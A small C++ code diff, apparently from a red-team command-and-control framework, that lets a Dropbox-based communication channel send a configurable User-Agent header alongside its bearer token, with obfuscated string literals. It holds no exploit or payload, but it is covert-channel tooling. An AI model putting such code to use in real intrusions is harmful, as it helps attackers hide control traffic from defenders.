@@ -20,12 +20,13 @@ namespace
 	}
 }
 
-FSecure::Dropbox::Dropbox(std::string const& token, std::string const& channelName)
+FSecure::Dropbox::Dropbox(std::string const& userAgent, std::string const& token, std::string const& channelName)
 {
 	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
 		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);
 
 	this->m_Token = token;
+	this->m_UserAgent = userAgent;
 	SetChannel(CreateChannel(Convert<Lowercase>(channelName)));
 }
 
@@ -211,7 +212,7 @@ FSecure::ByteVector FSecure::Dropbox::SendHttpRequest(std::string const& host, s
 			request.SetHeader(ToWideString("Dropbox-API-Arg"), ToWideString(header));
 
 		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
-
+		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));
 		auto resp = webClient.Request(request);
 
 		if (resp.GetStatusCode() == StatusCode::OK)
